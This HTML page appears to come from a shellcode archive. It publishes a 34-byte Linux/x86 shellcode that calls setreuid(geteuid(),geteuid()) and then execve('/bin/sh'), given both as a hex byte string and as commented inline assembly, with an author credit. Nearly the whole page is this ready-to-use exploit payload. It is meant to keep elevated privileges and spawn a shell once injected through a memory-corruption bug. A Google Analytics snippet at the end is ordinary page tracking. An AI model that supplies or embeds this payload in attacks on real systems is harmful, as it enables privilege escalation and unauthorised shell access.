<html><head><title>Linux/x86 - setreuid(geteuid(),geteuid()),execve(&quot;/bin/sh&quot;,0,0) - 34bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 *
 * linux/x86 setreuid(geteuid(),geteuid()),execve(&quot;/bin/sh&quot;,0,0) 34byte universal shellcode
 *
 * blue9057 root@blue9057.com
 *
 * /
int main()
{
    char shellcode[]=&quot;\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46&quot;
                              &quot;\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68&quot;
                              &quot;\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80&quot;;
    //setreuid(geteuid(),geteuid());
    //execve(&quot;/bin/sh&quot;,0,0);
    __asm__(&quot;&quot;
            &quot;push $0x31;&quot;
            &quot;pop %eax;&quot;
            &quot;cltd;&quot;
            &quot;int $0x80;&quot;        // geteuid();
            &quot;mov %eax, %ebx;&quot;
            &quot;mov %eax, %ecx;&quot;
            &quot;push $0x46;&quot;    // setreuid(geteuid(),geteuid());
            &quot;pop %eax;&quot;
            &quot;int $0x80;&quot;
            &quot;mov $0xb, %al;&quot;
            &quot;push %edx;&quot;
            &quot;push $0x68732f6e;&quot;
            &quot;push $0x69622f2f;&quot;
            &quot;mov %esp, %ebx;&quot;
            &quot;mov %edx, %ecx;&quot;
            &quot;int $0x80;&quot;        // execve(&quot;/bin/sh&quot;,0,0);
            &quot;&quot;);
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
